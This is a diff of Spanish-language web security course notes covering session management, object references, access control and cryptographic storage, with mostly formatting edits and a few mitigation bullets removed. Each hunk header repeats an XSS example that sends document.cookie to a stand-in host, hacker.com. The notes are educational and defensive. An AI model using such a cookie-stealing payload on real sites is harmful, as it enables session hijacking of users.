@@ -322,7 +322,7 @@ window.open(http://hacker.com/info.pl?document.cookie)</script>
 
 - Credenciales y tokens de sesión no bien protegidos
 - Los atacantes pueden obtener contraseñas, claves o tokens → Robo de sesión
-- HTTP/S no tiene estado
+- **HTTP/S no tiene estado**
     - El identificador de sesión se incluye en cada petición
     - En muchos casos es visible en:
         - La red, en el navegador (Live HTTP Headers), logs, ...
@@ -355,17 +355,6 @@ window.open(http://hacker.com/info.pl?document.cookie)</script>
     - El identificador de sesión **debe caducar**
         - **Regenerar el identificador de la sesión**
         - Cookies en el lado del cliente: fecha de expiración
-
-### Gestión de autenticación
-
-- Puede dañar la seguridad:
-    - Formularios para el cambio de contraseña
-    - Formularios para contraseñas olvidadas
-    - Políticas de contraseña
-    - Periodo de validez de contraseña
-    - Almacenar contraseñas de manera segura
-    - Proteger la comunicación
-    - Informar a los usuarios sobre los riesgos y consecuencias de aceptar conexiones inseguras
 
 ## 7. Referencia directa insegura a objetos
 
@@ -502,14 +491,11 @@ window.open(http://hacker.com/info.pl?document.cookie)</script>
     - **Acceso no autorizado** a datos/cuentas de otros usuarios
     - Realizar **operaciones privilegiadas** o escalar privilegios
     - Revelación de **datos sensibles**
-- **Mitigación**
+- **Mitigación**:
     - Asegurar tres cosas:
         - **Acceso restringido** a usuarios autorizados
         - **Gestionar permisos** basados en usuario o grupo
         - **Bloquear** todo tipo de peticiones a **páginas no autorizadas**
-- Verificar el control de acceso en cada capa de la arquitectura
-- Verificar que el **servidor deniega peticiones** a tipos de fichero no autorizados por defecto
-- Escaneos rutinarios
 
 ## 11. Redirecciones y reenvíos
 
@@ -610,7 +596,7 @@ window.open(http://hacker.com/info.pl?document.cookie)</script>
         - Típicos logs que se quedan desprotegidos, ...
         - Los atacantes consiguen acceso no autorizado a cuentas, datos, etc.
     - **Fallos en la implementación** del cifrado:
-        - **Almacenaje inseguro** o incorrecto de contraseñas, certificados, claves …
+        - **Almacenaje inseguro** o incorrecto de contraseñas, certificados, claves,...
             - Ejemplo: Contraseñas en BASE64 en vez de cifradas
         - Uso de un **algoritmo inadecuado**
             - Ejemplo: MD5 para almacenar contraseñas
@@ -622,8 +608,8 @@ window.open(http://hacker.com/info.pl?document.cookie)</script>
         - Identificar los puntos donde se guardan
         - Identificar posibles riegos
     - **Utilizar el cifrado** para paliar los riesgos
-        ▪ **Mecanismos de cifrado apropiados** a las circunstancias
-        ▪ Utilizar de manera correcta
+        - **Mecanismos de cifrado apropiados** a las circunstancias
+        - Utilizar de manera correcta
             - Algoritmos estándar
             - Generación, distribución y protección de claves apropiada
             - Cambios de clave
